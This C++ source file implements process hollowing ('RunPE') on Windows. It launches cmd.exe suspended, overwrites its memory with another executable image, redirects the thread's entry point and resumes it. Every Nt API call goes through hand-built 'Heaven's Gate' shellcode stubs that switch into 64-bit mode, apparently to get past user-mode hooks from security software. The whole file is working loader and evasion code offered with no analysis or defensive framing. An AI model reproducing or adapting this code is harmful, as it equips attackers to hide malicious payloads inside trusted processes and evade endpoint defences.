#include <Windows.h>

#include <fstream>
#include <iostream>
#include <string>

#include "wow64ext.h"

using namespace std;

auto memcpy64 = ((void(cdecl*)(ULONG64, ULONG64, ULONG64))(
    (PCSTR)
    // enter 64 bit mode
    "\x6a\x33"                         /* push   0x33                     */
    "\xe8\x00\x00\x00\x00"             /* call   $+5                      */
    "\x83\x04\x24\x05"                 /* add    DWORD PTR [esp],0x5      */
    "\xcb"                             /* retf                            */
    // memcpy for 64 bit               
    "\x67\x48\x8b\x7c\x24\x04"         /* mov    rdi,QWORD PTR [esp+0x4]  */
    "\x67\x48\x8b\x74\x24\x0c"         /* mov    rsi,QWORD PTR [esp+0xc]  */
    "\x67\x48\x8b\x4c\x24\x14"         /* mov    rcx,QWORD PTR [esp+0x14] */
    "\xf3\xa4"                         /* rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] */
    // exit 64 bit mode
    "\xe8\x00\x00\x00\x00"             /* call   $+5                      */
    "\xc7\x44\x24\x04\x23\x00\x00\x00" /* mov    DWORD PTR [rsp+0x4],0x23 */
    "\x83\x04\x24\x0d"                 /* add    DWORD PTR [rsp],0xd      */
    "\xcb"                             /* retf                            */
    "\xc3"                             /* ret                             */));

PEB64* GetPEB64() {
  // mov eax,gs:[00000060]; ret
  return ((PEB64 * (*)()) & "\x65\xA1\x60\x00\x00\x00\xC3")();
}

string GetString(ULONG64 str_addr) {
  CHAR buffer[MAX_PATH] = {0};
  memcpy64((ULONG64)&buffer, str_addr, sizeof(buffer));
  return *new string(buffer);
}

wstring GetWideString(ULONG64 ptr64bStr) {
  WCHAR buffer[MAX_PATH] = {0};
  memcpy64((ULONG64)&buffer, ptr64bStr, sizeof(buffer));
  return *new wstring(buffer);
}

UINT64 GetModuleAddress(const wchar_t* dll_name) {
  PEB_LDR_DATA64 ldr_node = {0};
  LDR_DATA_TABLE_ENTRY64 curr_node = {0};

  memcpy64((ULONG64)&ldr_node, (ULONG64)GetPEB64()->Ldr, sizeof(ldr_node));

  for (ULONG64 curr = ldr_node.InLoadOrderModuleList.Flink;; curr = curr_node.InLoadOrderLinks.Flink) {
    memcpy64((ULONG64)&curr_node, curr, sizeof(curr_node));
    if (wcsstr(dll_name, GetWideString(curr_node.BaseDllName.Buffer).c_str())) return curr_node.DllBase;
  }
  return 0;
}

size_t GetApiAddress(const char* NtApiName) {
  BYTE* dumped_image = nullptr;
  BYTE* ntdll_buffer = nullptr;

  auto file_name = "C:/Windows/SysWoW64/ntdll.dll";
  streampos file_len;
  fstream file(file_name, ios::in | ios::binary | ios::ate);

  if (file.is_open()) {
    file_len = file.tellg();
    ntdll_buffer = new BYTE[file_len]();
    file.seekg(0, ios::beg);
    file.read((char*)ntdll_buffer, file_len);
  }

  PIMAGE_NT_HEADERS nt_header = PIMAGE_NT_HEADERS(ntdll_buffer + PIMAGE_DOS_HEADER(ntdll_buffer)->e_lfanew);
  dumped_image = new BYTE[nt_header->OptionalHeader.SizeOfImage]();
  memcpy(dumped_image, ntdll_buffer, nt_header->OptionalHeader.SizeOfHeaders);
  for (size_t i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
    auto curr = PIMAGE_SECTION_HEADER(size_t(nt_header) + sizeof(IMAGE_NT_HEADERS))[i];
    memcpy(dumped_image + curr.VirtualAddress, ntdll_buffer + curr.PointerToRawData, curr.SizeOfRawData);
  }
  // delete[] ntdll_buffer;
  file.close();

  PIMAGE_NT_HEADERS dumped_nt_header = PIMAGE_NT_HEADERS(dumped_image + PIMAGE_DOS_HEADER(dumped_image)->e_lfanew);
  auto temp = dumped_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  PIMAGE_EXPORT_DIRECTORY export_table = PIMAGE_EXPORT_DIRECTORY((LPBYTE(dumped_image) + temp.VirtualAddress));
  uint32_t* names_addr = (uint32_t*)(dumped_image + export_table->AddressOfNames);
  uint16_t* name_ords_addr = (uint16_t*)(dumped_image + export_table->AddressOfNameOrdinals);
  uint32_t* addr_of_func_addr = (uint32_t*)(dumped_image + export_table->AddressOfFunctions);

  size_t ret = 0;
  do {
    if (export_table->NumberOfNames == 0) break;
    for (DWORD i = 0; i < export_table->NumberOfNames; i++)
      if (!stricmp((char*)(dumped_image + names_addr[i]), NtApiName)) {
        ret = (size_t)(dumped_image + addr_of_func_addr[name_ords_addr[i]]);
        break;
      }
  } while (false);

  // delete[] dumped_image;
  return ret;
}

void GetWow64SystemServiceEx(UINT64& value) {
  auto wow64_base = GetModuleAddress(L"wow64.dll");
  printf("[v] current wow64.dll @ %llx\n", wow64_base);

  char wow64_buf[4096] = {0};
  memcpy64((ULONG)&wow64_buf, wow64_base, sizeof(wow64_buf));
  auto temp = PIMAGE_NT_HEADERS64(&wow64_buf[0] + PIMAGE_DOS_HEADER(wow64_buf)->e_lfanew);
  auto export_rva = temp->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  memcpy64((ULONG)&wow64_buf, wow64_base + export_rva, sizeof(wow64_buf));

  auto name_num = PIMAGE_EXPORT_DIRECTORY(wow64_buf)->NumberOfNames;
  auto names_addr = new UINT32[name_num + 1], func_addr = new UINT32[name_num + 1]();
  auto name_ords_addr = new UINT16[name_num + 1];
  memcpy64((ULONG)names_addr, wow64_base + PIMAGE_EXPORT_DIRECTORY(wow64_buf)->AddressOfNames,
           sizeof(UINT32) * name_num);
  memcpy64((ULONG)name_ords_addr, wow64_base + PIMAGE_EXPORT_DIRECTORY(wow64_buf)->AddressOfNameOrdinals,
           sizeof(UINT16) * name_num);
  memcpy64((ULONG)func_addr, wow64_base + PIMAGE_EXPORT_DIRECTORY(wow64_buf)->AddressOfFunctions,
           sizeof(UINT32) * name_num);

  for (size_t i = 0; i < name_num; i++) {
    auto currApiName = GetString(wow64_base + names_addr[i]);
    printf("[v] found export API -- %s\n", currApiName.c_str());
    if (strstr("Wow64SystemServiceEx", currApiName.c_str())) value = wow64_base + func_addr[name_ords_addr[i]];
  }

  delete[] func_addr;
}

int X64Call(const char* NtApiName, ...) {
  PCHAR jit_stub;
  PCHAR api_addr = PCHAR(GetApiAddress(NtApiName));
  static uint64_t translator(0);
  if (!translator) GetWow64SystemServiceEx(translator);

  static uint8_t stub_template[] = {
      /* rewirte by API address*/
      0xB8, 0x00, 0x00, 0x00, 0x00,                   /* mov    eax,0x0                  */
      0x8b, 0x54, 0x24, 0x04,                         /* mov    edx,DWORD PTR [esp+0x4]  */
      0x89, 0xC1,                                     /* mov    ecx,eax                  */
      /* enter 64 bit mode */                         
      0x6A, 0x33,                                     /* push   0x33                     */
      0xE8, 0x00, 0x00, 0x00, 0x00,                   /* call   $+5                      */
      0x83, 0x04, 0x24, 0x05,                         /* add    DWORD PTR [esp],0x5      */
      0xCB,                                           /* retf                            */
      /* call API*/
      0x49, 0x87, 0xE6,                               /* xchg   r14,rsp                  */
      0xFF, 0x14, 0x25, 0xEF, 0xBE, 0xAD, 0xDE,       /* call   QWORD PTR ds:0xdeadbeef  */
      0x49, 0x87, 0xE6,                               /* xchg   r14,rsp                  */
      /* exit 64 bit mode */
      0xE8, 0x00, 0x00, 0x00, 0x00,                   /* call   $+5                      */
      0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, /* mov    DWORD PTR [rsp+0x4],0x23 */
      0x83, 0x04, 0x24, 0x0D,                         /* add    DWORD PTR [rsp],0xd      */
      0xCB,                                           /* retf                            */
      0xc3,                                           /* ret                             */
  };
  jit_stub = (PCHAR)VirtualAlloc(0, sizeof(stub_template), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(jit_stub, stub_template, sizeof(stub_template));
  va_list args;
  va_start(args, NtApiName);
  *((uint32_t*)&jit_stub[0x01]) = *(uint32_t*)&api_addr[1];
  *((uint32_t*)&jit_stub[0x1d]) = (size_t)&translator;
  auto ret = ((NTSTATUS(__cdecl*)(...))jit_stub)(args);
  return ret;
}

char* ReadFileToMemory(LPCSTR filename) {
  streampos size;
  fstream file(filename, ios::in | ios::binary | ios::ate);
  if (file.is_open()) {
    size = file.tellg();
    char* mem = new char[size]();
    file.seekg(0, ios::beg);
    file.read(mem, size);
    file.close();
    return mem;
  }
  return nullptr;
}

int RunPortableExecutable(void* Image) {
  IMAGE_DOS_HEADER* dos_header;
  IMAGE_NT_HEADERS* nt_header;
  IMAGE_SECTION_HEADER* section_header;
  PROCESS_INFORMATION pi;
  STARTUPINFOA si;
  CONTEXT* context;

  void* image_base;
  int count;
  char file_path[1024] = "C:\\Windows\\SysWOW64\\cmd.exe";

  dos_header = PIMAGE_DOS_HEADER(Image);
  nt_header = PIMAGE_NT_HEADERS(DWORD(Image) + dos_header->e_lfanew);

  if (nt_header->Signature == IMAGE_NT_SIGNATURE) {
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));

    if (CreateProcessA(file_path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
      context = LPCONTEXT(VirtualAlloc(NULL, sizeof(context), MEM_COMMIT, PAGE_READWRITE));
      context->ContextFlags = CONTEXT_FULL;

      if (GetThreadContext(pi.hThread, LPCONTEXT(context))) {
        image_base =
            VirtualAllocEx(pi.hProcess, LPVOID(nt_header->OptionalHeader.ImageBase),
                           nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (image_base == nullptr) {
          X64Call("ZwTerminateProcess", pi.hProcess, 0);
          return 0;
        }

        X64Call("NtWriteVirtualMemory", pi.hProcess, image_base, Image, nt_header->OptionalHeader.SizeOfHeaders, NULL);

        for (count = 0; count < nt_header->FileHeader.NumberOfSections; count++) {
          section_header = PIMAGE_SECTION_HEADER(DWORD(Image) + dos_header->e_lfanew + 248 + (count * 40));

          X64Call("NtWriteVirtualMemory", pi.hProcess, LPVOID(DWORD(image_base) + section_header->VirtualAddress),
                LPVOID(DWORD(Image) + section_header->PointerToRawData), section_header->SizeOfRawData, NULL);
        }

        X64Call("NtWriteVirtualMemory", pi.hProcess, LPVOID(context->Ebx + 8),
              LPVOID(&nt_header->OptionalHeader.ImageBase), 4, NULL);

        context->Eax = DWORD(image_base) + nt_header->OptionalHeader.AddressOfEntryPoint;
        X64Call("NtSetContextThread", pi.hThread, context);

        DWORD useless;
        X64Call("NtResumeThread", pi.hThread, &useless);

        return 0;
      }
    }
  }
  return -1;
}

int main(void) {
  auto filename = "wscript.exe";
  auto file = ReadFileToMemory(filename);
  if (file == nullptr) {
    printf("[x] file %s not found.\n", filename);
    return 0;
  }
  RunPortableExecutable(file);
  return 0;
}
